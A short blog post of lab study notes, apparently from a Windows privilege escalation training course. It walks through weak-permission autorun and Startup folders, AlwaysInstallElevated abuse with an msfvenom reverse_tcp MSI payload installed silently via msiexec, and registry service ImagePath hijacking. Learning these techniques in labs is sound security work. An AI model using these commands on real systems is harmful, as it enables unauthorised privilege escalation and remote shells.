---
layout: post
title: "Windows PrivEsc"
date:   2020-05-23 10:00:00
---
Here some of classic examples of windows priv esc (from Windows PrivEsc Arena/TCM)

# Windows - Accesschk
Accesschk is a useful console program for viewing the permissions on files, registry keys, services...
By combining the option:
{% highlight bash %}
-w : write access
-u : supress errors
-v : verbose
{% endhighlight %}
You can find directories in which you have write access with elevated privileges.

# Windows - Autorun
Autorun or Startup programs are services managed by the Service Manager
{% highlight bash %}
C:\Program Files\Autorun Program
{% endhighlight %}
If the permission for Everyone is FILE_ALL_ACCESS, so you just need to drop your program and wait for the admin to log in.

# Windows - Startup
This is the same thing as before, checking ACL permission:
{% highlight bash %}
iacls.exe C:\ProgramData\Microsoft\Windows\Start Menu\Prgrams\Startup
{% endhighlight %}
If the output is on full access (F) for BUILTIN\Users, then drop your program to do a reverse shell.
The target need to be logon as Administrator for the privilege access.

# Windows - Always Installed Elevated
One good way to know is the Installed Elevated feature is enable is to do:

<img src="{{ site.baseurl }}/assets/img/vulnuniversity/alwaysinstalled.png">
{% highlight bash %}
HKLM: H_KEY_Local_Machine
HKCU: H_KEY_Current_User
{% endhighlight %}
It represents the configuration related to the local machine and to the current user.

So what you need to do is generate a msi package:
{% highlight bash %}
msfvenom -p windows/meterpreter/reverse_tcp lhost=[your ip] -f msi -o setup.msi
{% endhighlight %}

And on the Windows machine execute it in background:
{% highlight bash %}
msiexec /quiet /qn /i C:\temp\setup.msi
/qn: no UI
/i: normal installation
/quiet: quiet mode (no user interaction)
{% endhighlight %}

# Windows Registry
In order to verify the fullControl privilege on the services, with powershell you can check:
{% highlight bash %}
Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\services\regsvc | fl
{% endhighlight %}
Should display: NT AUTHORITY\INTERACTIVE
That means you can create your custom service, replace the original one and execute it:
{% highlight bash %}
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /d c:\temp\service.exe /f
/v ImagePath: path of the service (this is the value)
/d for the data of the value
/f  add the registry key without prompting for confirmation
{% endhighlight %}
And then you can execute your service:
{% highlight bash %}
sc start regsvc
{% endhighlight %}
<img src="{{ site.baseurl }}/assets/img/vulnuniversity/services1.png">
<img src="{{ site.baseurl }}/assets/img/vulnuniversity/services2.png">
